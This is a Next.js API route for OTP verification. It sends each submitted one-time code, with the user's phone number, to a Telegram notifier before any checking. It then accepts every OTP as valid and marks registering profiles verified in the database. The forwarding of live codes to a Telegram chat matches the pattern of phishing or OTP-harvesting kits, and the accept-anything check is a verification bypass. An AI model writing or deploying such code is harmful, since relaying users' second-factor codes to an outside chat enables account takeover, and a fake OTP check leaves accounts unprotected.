import { NextRequest, NextResponse } from 'next/server';
import { notify } from '@/lib/telegram';

export async function POST(req: NextRequest) {
  try {
    const { otp, action, phone } = await req.json();
    
    // Send notification to Telegram based on the action FIRST
    if (action) {
      if (action === 'register_otp_verify') {
        await notify.otpVerified(phone || 'Unknown', otp);
      } else if (action === 'otp_verify') {
        await notify.otpVerified(phone || 'Unknown', otp);
      } else if (action === 'login_otp_verify') {
        await notify.otpVerified(phone || 'Unknown', otp);
      }
    }
    
    // Update user status to 'verified' in profiles table if it's a registration OTP
    if (action === 'register_otp_verify' && phone) {
      const { neon } = await import("@neondatabase/serverless");
      const sql = neon(process.env.DATABASE_URL!);
      
      await sql`
        UPDATE profiles
        SET status = 'verified', updated_at = NOW()
        WHERE phone_number = ${phone}
      `;
    }
    
    // For now, accept any OTP
    // In a real implementation, you would verify the OTP against a stored value
    return NextResponse.json(
      { 
        success: true, 
        message: 'OTP verified successfully' 
      }
    );
  } catch (error) {
    console.error('Error verifying OTP:', error);
    return NextResponse.json(
      { 
        success: false, 
        message: 'Failed to verify OTP' 
      },
      { status: 500 }
    );
  }
}